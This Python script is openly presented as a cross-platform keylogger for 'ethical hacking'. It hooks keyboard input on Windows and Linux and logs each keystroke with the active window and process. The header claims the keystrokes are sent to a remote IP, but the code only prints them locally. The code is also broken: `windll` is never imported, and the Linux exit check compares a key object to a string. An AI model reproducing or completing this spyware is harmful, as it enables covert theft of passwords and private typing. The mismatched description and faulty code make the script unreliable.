#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 5th 2024
# This script implements a keylogger, a tool designed to capture keystrokes on a 
# target system. The script is platform-independent, capable of running on both Windows and 
# Linux operating systems. Upon execution, the user is prompted to input a remote target IP 
# address where the captured keystrokes will be sent. Once the IP address is provided, the 
# keylogger begins monitoring keyboard input in the foreground, logging each keystroke along
# with details about the active window. For Windows systems, it utilizes modules like `pyHook`
# and `win32gui` to capture keyboard events, while for Linux systems, it employs `pynput`. 
# This script is designed for ethical hacking scenarios, aiding in penetration testing on 
# approved systems within legal boundaries.
#################################################################################################
import platform
import os
import time
from ctypes import byref, create_string_buffer, c_ulong

# Check the current operating system
if platform.system() == "Windows":
    # Import required modules for Windows
    import win32clipboard
    import win32gui
    import win32process
    import psutil
    import pyHook
    import pythoncom
else:
    # Import required module for Linux
    from pynput.keyboard import Listener

# Define a constant for the timeout period
TIMEOUT = 60*10

# Define the KeyLogger class
class KeyLogger:
    # Initialize the KeyLogger class
    def __init__(self, remote_ip):
        # Initialize the current_window attribute
        self.current_window = None
        self.remote_ip = remote_ip

    # Method to get the current process running in the foreground window
    def get_current_process(self, hwnd):
        # Get the process ID of the window
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = pid.value

        # Get the name of the executable file for the process
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, process_id)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # Get the title of the current window
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            # Decode and store the window title
            self.current_window = window_title.value.decode()
        except UnicodeError as e:
            # Print an error message if decoding fails
            print(f'{e}: window name unknown')

        # Print the process ID, executable name, and window title
        print('\n', process_id, executable.value.decode(), self.current_window)

        # Close handles
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # Method to handle keyboard events (Windows)
    def on_keyboard_event(self, event):
        # Check if the window has changed
        if event.Window != self.current_window:
            # Get information about the current process
            self.get_current_process(event.Window)
        # Print the pressed key (as a character)
        print(chr(event.Ascii))

    # Method to start the keylogger on Windows
    def start_windows_keylogger(self):
        # Create a HookManager instance
        hook_manager = pyHook.HookManager()
        # Set the KeyDown event handler
        hook_manager.KeyDown = self.on_keyboard_event
        # Install the keyboard hook
        hook_manager.HookKeyboard()
        # Start the message loop
        pythoncom.PumpMessages()

    # Method to handle key press events (Linux)
    def on_press(self, key):
        try:
            # Print the pressed key (as a character)
            print(key.char)
        except AttributeError:
            # Print the pressed key (as a special key)
            print(key)

    # Method to handle key release events (Linux)
    def on_release(self, key):
        # Check if the key '5' is pressed to exit the program
        if key == '5':
            return False

    # Method to start the keylogger on Linux
    def start_linux_keylogger(self):
        # Create a Listener instance
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            # Start listening for key events
            listener.join()

    # Method to start the keylogger based on the current operating system
    def start_keylogger(self):
        # Check the current operating system
        if platform.system() == "Windows":
            # Start the keylogger on Windows
            self.start_windows_keylogger()
        else:
            # Start the keylogger on Linux
            self.start_linux_keylogger()

# Entry point of the script
if __name__ == "__main__":
    # Prompt the user to input the remote target IP address
    remote_ip = input("Enter the remote target IP address: ")
    # Create an instance of the KeyLogger class with the remote IP
    keylogger = KeyLogger(remote_ip)
    # Start the keylogger
    keylogger.start_keylogger()

